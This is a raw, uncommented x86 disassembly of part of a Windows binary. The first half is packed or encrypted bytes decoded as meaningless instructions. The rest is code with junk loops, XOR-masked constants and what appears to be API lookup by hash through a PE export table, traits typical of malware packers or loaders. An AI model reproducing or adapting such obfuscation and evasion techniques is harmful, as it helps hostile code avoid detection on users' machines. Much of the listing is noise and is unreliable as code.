  40802c:	push   0x52
  40802e:	jg     0x40801e
  408030:	dec    edi
  408031:	rol    DWORD PTR [ebp+eax*2-0x7e],0x5e
  408036:	sbb    dl,BYTE PTR [ebx-0x41808160]
  40803c:	and    BYTE PTR ds:0x86de706e,bl
  408042:	xor    eax,0xaaef14ad
  408047:	rol    BYTE PTR [ecx-0x23ee7cb2],1
  40804d:	mov    al,0x47
  40804f:	add    BYTE PTR [esi+0x55],0x67
  408053:	mov    al,ds:0x952d7c30
  408058:	xor    cl,BYTE PTR [ebx+ebx*1]
  40805b:	mov    ah,bh
  40805d:	adc    DWORD PTR [edi],esi
  40805f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408060:	cwde   
  408061:	and    eax,0xeaf2964a
  408066:	xchg   ecx,eax
  408067:	sub    BYTE PTR [ebx+0x66],dh
  40806a:	gs pop eax
  40806c:	lods   al,BYTE PTR ds:[esi]
  40806d:	cdq    
  40806e:	nop
  40806f:	clc    
  408070:	sub    ebx,DWORD PTR [eax+0x7bc4e44b]
  408076:	jmp    0x40802e
  408078:	cmp    DWORD PTR [esi],edx
  40807a:	imul   edx,edi,0x1e67f855
  408080:	jo     0x4080d8
  408082:	jge    0x40806f
  408084:	inc    ecx
  408085:	int3   
  408086:	adc    edx,DWORD PTR [ecx+esi*4]
  408089:	call   0x8af0:0x7544513e
  408090:	xchg   ebx,eax
  408091:	jecxz  0x4080b6
  408093:	add    eax,0xffffffb3
  408096:	jbe    0x4080ec
  408098:	jne    0x408024
  40809a:	cs xchg ebp,eax
  40809c:	and    BYTE PTR ds:[edx+0x3f30db5],0xce
  4080a4:	or     BYTE PTR [ebp-0x5d72b63d],0x8a
  4080ab:	dec    edi
  4080ac:	das    
  4080ad:	ret    
  4080ae:	xchg   edi,eax
  4080af:	mov    ebp,0xef542ac1
  4080b4:	xor    DWORD PTR [edx],ebp
  4080b6:	inc    esp
  4080b7:	or     eax,0x5c8a39b3
  4080bc:	les    ebx,FWORD PTR [ebp-0x6ece2f77]
  4080c2:	inc    ebp
  4080c3:	lock je 0x40808f
  4080c6:	movd   mm3,DWORD PTR [ebx-0x46bb32c3]
  4080cd:	dec    ebx
  4080ce:	mov    ch,0xc4
  4080d0:	rol    ebp,0x9f
  4080d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d4:	es dec ebp
  4080d6:	cld    
  4080d7:	neg    BYTE PTR [edi+ecx*1]
  4080da:	dec    ebx
  4080db:	test   DWORD PTR [ecx],eax
  4080dd:	mov    ebx,0x8f1e90ed
  4080e2:	sbb    ebx,DWORD PTR [ebp-0x7d]
  4080e5:	jns    0x4080d2
  4080e7:	out    0x92,al
  4080e9:	lods   al,BYTE PTR ds:[esi]
  4080ea:	in     al,dx
  4080eb:	push   ebp
  4080ec:	or     edx,DWORD PTR [ebx]
  4080ee:	pop    ds
  4080ef:	mov    edi,0xabf9cc3d
  4080f4:	lock aad 0x5a
  4080f7:	xchg   DWORD PTR [ebx+0x134b9af7],edx
  4080fd:	outs   dx,BYTE PTR ds:[esi]
  4080fe:	dec    ebp
  4080ff:	mov    al,0xd3
  408101:	dec    ebp
  408102:	aas    
  408103:	das    
  408104:	rcl    BYTE PTR [ecx+eax*2+0xa],cl
  408108:	xor    bl,BYTE PTR [eax+0x32a6cab8]
  40810e:	jb     0x4080ac
  408110:	in     al,0x17
  408112:	cli    
  408113:	cmp    DWORD PTR [esi+0xa],ebx
  408116:	int3   
  408117:	imul   edx,DWORD PTR [edx],0xc66dfb03
  40811d:	or     DWORD PTR [eax],0x5058064d
  408123:	outs   dx,DWORD PTR ds:[esi]
  408124:	out    0x63,eax
  408126:	cdq    
  408127:	sbb    eax,DWORD PTR [esi-0x22]
  40812a:	stc    
  40812b:	mov    bh,0x5f
  40812d:	or     bl,BYTE PTR [ebx+edi*4+0x43cbec08]
  408134:	pop    ecx
  408135:	pushf  
  408136:	test   DWORD PTR [ecx+0x204132ed],0x3acf5991
  408140:	mov    esp,0x5cd29ebb
  408145:	jle    0x408117
  408147:	imul   ebx,DWORD PTR [si-0xd27],0xc141a7a7
  408150:	sbb    BYTE PTR [ebp-0x1bbf5f11],cl
  408156:	xchg   edi,eax
  408157:	shl    BYTE PTR ds:0xf067f197,cl
  40815d:	test   al,0xd8
  40815f:	cmp    al,0xfd
  408161:	adc    al,0xbf
  408163:	xor    bh,BYTE PTR [ecx+0xb11e530]
  408169:	ja     0x4081df
  40816b:	outs   dx,DWORD PTR ds:[esi]
  40816c:	cld    
  40816d:	push   ebp
  40816e:	imul   edx,DWORD PTR [edx+0x7ff87377],0xa8ba08c9
  408178:	push   ecx
  408179:	push   ecx
  40817a:	add    esi,DWORD PTR [eax]
  40817c:	lods   eax,DWORD PTR ds:[esi]
  40817d:	or     al,0x81
  40817f:	in     eax,dx
  408180:	and    eax,0x39c59df0
  408185:	add    eax,DWORD PTR [eax]
  408187:	xor    eax,0xc8a84ac2
  40818c:	mov    al,ds:0x4825cd7f
  408191:	inc    ebp
  408192:	mov    WORD PTR [ecx+ebp*2-0x6a],ss
  408196:	mov    dh,0xb6
  408198:	mov    esi,0xdb9e9a3f
  40819d:	xchg   edx,eax
  40819e:	mov    edi,0x1022977d
  4081a3:	icebp  
  4081a4:	add    al,0x45
  4081a6:	test   eax,0x89db31de
  4081ab:	lods   eax,DWORD PTR ds:[esi]
  4081ac:	mov    dh,BYTE PTR [esi]
  4081ae:	mov    al,ss:0x51726515
  4081b4:	bound  eax,QWORD PTR [ebp+0x143efbe6]
  4081ba:	mov    BYTE PTR [esi+0x6b470770],bl
  4081c0:	push   edx
  4081c1:	mov    bh,0x53
  4081c3:	add    al,0x61
  4081c5:	inc    eax
  4081c6:	jo     0x408183
  4081c8:	js     0x40819d
  4081ca:	fs mov ebx,0x84a46f53
  4081d0:	dec    eax
  4081d1:	jg     0x408231
  4081d3:	fidiv  WORD PTR [ebx+eiz*8-0x58f1ad72]
  4081da:	aaa    
  4081db:	push   esi
  4081dc:	push   DWORD PTR [esi+0x2ef64fef]
  4081e2:	mov    ss,WORD PTR [ebx]
  4081e4:	aas    
  4081e5:	push   ecx
  4081e6:	and    BYTE PTR fs:[edi-0x1d44ce17],bh
  4081ed:	sub    ebp,DWORD PTR ds:0x191a3f6c
  4081f3:	aaa    
  4081f4:	jg     0x408260
  4081f6:	mov    eax,ds:0xb955cfb4
  4081fb:	aas    
  4081fc:	fldlg2 
  4081fe:	add    eax,DWORD PTR [ecx]
  408200:	mov    edi,0x70baac8e
  408205:	inc    edx
  408206:	test   al,0x7e
  408208:	mov    esi,0xec114220
  40820d:	inc    esp
  40820e:	push   eax
  40820f:	add    ch,BYTE PTR [ebx]
  408211:	add    bl,BYTE PTR [eax+0x35]
  408214:	push   edx
  408215:	sahf   
  408216:	pusha  
  408217:	mov    esp,0x20a72632
  40821c:	es test eax,0xbc9b2a4a
  408222:	rcl    edi,1
  408224:	pop    ss
  408225:	pop    es
  408226:	pop    esi
  408227:	clc    
  408228:	xor    bl,BYTE PTR [esi+0x61]
  40822b:	aas    
  40822c:	mov    WORD PTR [ebx],gs
  40822e:	cmp    eax,0x849cd63c
  408233:	jno    0x40826f
  408235:	ret    
  408236:	pop    DWORD PTR [edi]
  408238:	adc    al,0x1c
  40823a:	daa    
  40823b:	and    DWORD PTR [eax+0x64f085af],esi
  408241:	xchg   DWORD PTR [esi-0x47],edi
  408244:	push   ss
  408245:	xchg   edx,eax
  408246:	inc    ecx
  408247:	or     eax,0x9e3c98d9
  40824c:	cmp    bl,0xb0
  40824f:	test   DWORD PTR [ecx+0x1c],edi
  408252:	js     0x40825e
  408254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408255:	dec    edi
  408256:	sbb    BYTE PTR [esi],ch
  408258:	mov    ebp,0x51154a41
  40825d:	xchg   edx,eax
  40825e:	sbb    BYTE PTR [ebp-0x5f],bl
  408261:	pop    ebx
  408262:	cwde   
  408263:	xchg   ebx,eax
  408264:	xchg   ebp,eax
  408265:	lods   eax,DWORD PTR ds:[esi]
  408266:	sbb    al,0x27
  408268:	fsubr  DWORD PTR [ebx+0x6c4d9f3b]
  40826e:	mov    ds:0xbbe0bb25,eax
  408273:	xor    al,0x58
  408275:	sbb    bh,BYTE PTR [edx-0x2d]
  408278:	cld    
  408279:	test   bl,0xac
  40827c:	add    al,0x27
  40827e:	inc    ebx
  40827f:	out    0xf,eax
  408281:	in     eax,dx
  408282:	jl     0x4082ac
  408284:	push   ebp
  408285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408286:	adc    DWORD PTR [esi-0x51a87546],edi
  40828c:	sbb    cl,bh
  40828e:	unpckhps xmm7,XMMWORD PTR [ecx]
  408291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408292:	lds    esp,FWORD PTR [ecx+0x1f]
  408295:	pop    eax
  408296:	add    al,0x9
  408298:	adc    BYTE PTR [esi+0x1910a84d],dl
  40829e:	mov    esp,0x909a55c9
  4082a3:	imul   esp,DWORD PTR [esp+edx*2+0x455af644],0xffffffdc
  4082ab:	ficom  DWORD PTR [edi]
  4082ad:	outs   dx,BYTE PTR ds:[esi]
  4082ae:	in     eax,0x80
  4082b0:	xchg   ebx,eax
  4082b1:	int3   
  4082b2:	push   eax
  4082b3:	xor    ebx,DWORD PTR [eax-0x27]
  4082b6:	jo     0x408247
  4082b8:	ss cdq 
  4082ba:	push   cs
  4082bb:	adc    DWORD PTR [ecx+esi*2],0xfa933722
  4082c2:	dec    edx
  4082c3:	jae    0x408270
  4082c5:	addr16 mov dl,0x5a
  4082c8:	or     eax,0x8b348a56
  4082cd:	xor    DWORD PTR [esi],esp
  4082cf:	dec    ecx
  4082d0:	pop    eax
  4082d1:	cmp    ah,BYTE PTR [eax+edx*8-0x3c]
  4082d5:	imul   ebp,DWORD PTR [ecx+0x32],0x2d
  4082d9:	clc    
  4082da:	mov    ecx,0x3e740ac1
  4082df:	cmp    eax,0xacdc9a3b
  4082e4:	push   ebp
  4082e5:	int    0xd9
  4082e7:	mov    esi,0x3f38f984
  4082ec:	mov    ah,BYTE PTR [ebx+ebp*4]
  4082ef:	aad    0x41
  4082f1:	pop    ebp
  4082f2:	and    ah,BYTE PTR [edx+0x59]
  4082f5:	jno    0x40829c
  4082f7:	inc    esp
  4082f8:	mov    BYTE PTR [ecx-0x50a39082],ch
  4082fe:	sbb    esi,edi
  408300:	push   edi
  408301:	pusha  
  408302:	pop    eax
  408303:	imul   esi,edx,0xffffffd8
  408306:	(bad)  
  408307:	lock enter 0x96fe,0x25
  40830c:	and    BYTE PTR [esi+ecx*2],bl
  40830f:	pop    esp
  408310:	in     eax,dx
  408311:	rol    DWORD PTR [ebp+0x28],1
  408314:	jp     0x40829c
  408316:	loop   0x4082ed
  408318:	scas   eax,DWORD PTR es:[edi]
  408319:	pop    ecx
  40831a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40831b:	(bad)  
  40831c:	or     BYTE PTR [edx],ch
  40831e:	test   BYTE PTR [edx+0x19],ch
  408321:	xor    eax,0xd8993a28
  408326:	mov    ecx,0x5c584782
  40832b:	shl    BYTE PTR [eax-0x28251ec3],cl
  408331:	cmp    DWORD PTR [eax-0x6a],esp
  408334:	add    esp,0xc94c274c
  40833a:	inc    esi
  40833b:	out    dx,al
  40833c:	mov    ebp,0xcf1062f0
  408341:	enter  0xaa3a,0x5
  408345:	aaa    
  408346:	call   0x177d:0xd521e279
  40834d:	push   esp
  40834e:	(bad)  
  40834f:	xchg   edi,eax
  408350:	popf   
  408351:	inc    esp
  408352:	ss sub bh,dh
  408355:	mov    bl,BYTE PTR [esi-0x72]
  408358:	js     0x4083b4
  40835a:	fild   WORD PTR [ebx+edx*4+0x6c2c1009]
  408361:	pusha  
  408362:	and    DWORD PTR ds:0x95a678de,ecx
  408368:	xchg   BYTE PTR [eax-0x51],cl
  40836b:	xor    eax,0x251c10f0
  408370:	sbb    BYTE PTR [ebx-0x2b],ch
  408373:	xlat   BYTE PTR ds:[ebx]
  408374:	(bad)  
  408376:	not    BYTE PTR [esi+0x56]
  408379:	adc    esi,DWORD PTR [eax+0x7b]
  40837c:	fist   DWORD PTR [ecx]
  40837e:	clc    
  40837f:	mov    dl,0x6f
  408381:	inc    ebp
  408382:	push   edi
  408383:	into   
  408384:	hlt    
  408385:	sbb    BYTE PTR [ecx],0x69
  408388:	mov    BYTE PTR [esi-0x494d09e1],dl
  40838e:	mov    ch,0x16
  408390:	push   ds
  408391:	shl    al,cl
  408393:	jmp    0x40838c
  408395:	scas   al,BYTE PTR es:[edi]
  408396:	jns    0x408329
  408398:	enter  0x70e2,0xe0
  40839c:	and    al,0x33
  40839e:	inc    esp
  40839f:	loope  0x408324
  4083a1:	outs   dx,BYTE PTR ds:[esi]
  4083a2:	lock dec edx
  4083a4:	xor    BYTE PTR [eax+eax*2-0x7f1e7eb3],0x24
  4083ac:	cmp    BYTE PTR [ebp-0x26],ch
  4083af:	test   ax,0xf2d4
  4083b3:	popa   
  4083b4:	daa    
  4083b5:	mov    bh,0xc2
  4083b7:	mov    ebx,ebx
  4083b9:	xlat   BYTE PTR ds:[ebx]
  4083ba:	ja     0x4083c4
  4083bc:	in     eax,dx
  4083bd:	addr16 out dx,eax
  4083bf:	dec    esi
  4083c0:	shl    DWORD PTR [esi+eiz*1+0x4cba7cc1],cl
  4083c7:	xor    eax,0xe2dbded2
  4083cc:	and    DWORD PTR ss:[ecx],edx
  4083cf:	add    cl,bh
  4083d1:	int3   
  4083d2:	cmp    DWORD PTR [ebp+edx*4-0x63],esi
  4083d6:	loope  0x408393
  4083d8:	mov    ebp,0xa26aca5f
  4083dd:	and    eax,0x22da4444
  4083e2:	and    edi,DWORD PTR [eax]
  4083e4:	mov    dl,0xad
  4083e6:	test   dh,al
  4083e8:	push   eax
  4083e9:	aas    
  4083ea:	and    BYTE PTR [ecx-0x69],cl
  4083ed:	xchg   ecx,eax
  4083ee:	push   es
  4083ef:	xor    eax,0x2d818ac6
  4083f4:	cmp    al,0xd2
  4083f6:	jge    0x4083d7
  4083f8:	mov    bh,0xdd
  4083fa:	lods   eax,DWORD PTR ds:[esi]
  4083fb:	add    BYTE PTR [ebp+0x40b227e6],dl
  408401:	fadd   DWORD PTR [ebp-0x3e]
  408404:	pop    es
  408405:	fmulp  st(5),st
  408407:	clc    
  408408:	jmp    0x90f:0xcbda9a4
  40840f:	xor    DWORD PTR [eax],ebp
  408411:	xor    BYTE PTR [edi],ah
  408413:	sti    
  408414:	inc    esi
  408415:	adc    BYTE PTR [ebp+eax*8-0x4ca88aa7],cl
  40841c:	int3   
  40841d:	popa   
  40841e:	retf   
  40841f:	mov    ecx,0x2e8d4662
  408424:	call   0xf66888d
  408429:	sub    eax,ebx
  40842b:	fadd   QWORD PTR [eax+0x52]
  40842e:	inc    esi
  40842f:	mov    DWORD PTR [eax-0x9440c97],eax
  408435:	cdq    
  408436:	jecxz  0x408409
  408438:	and    DWORD PTR [ebx-0x45],0x7d
  40843c:	xchg   ebp,eax
  40843d:	int3   
  40843e:	stos   BYTE PTR es:[edi],al
  40843f:	push   edx
  408440:	and    DWORD PTR [ebx],ebp
  408442:	push   0xffffffee
  408444:	cmp    ecx,DWORD PTR [ecx+ebx*4-0x72d9287c]
  40844b:	sbb    DWORD PTR [esi],0xef027d5c
  408451:	add    BYTE PTR ds:0xfa12e7f3,bl
  408457:	loop   0x4084bd
  408459:	imul   ebx,DWORD PTR [esi-0xd],0xfc2e4b20
  408460:	pop    es
  408461:	inc    ebp
  408462:	stos   BYTE PTR es:[edi],al
  408463:	fist   WORD PTR [ecx+0x4c]
  408466:	push   0xffffffff
  408468:	pushf  
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
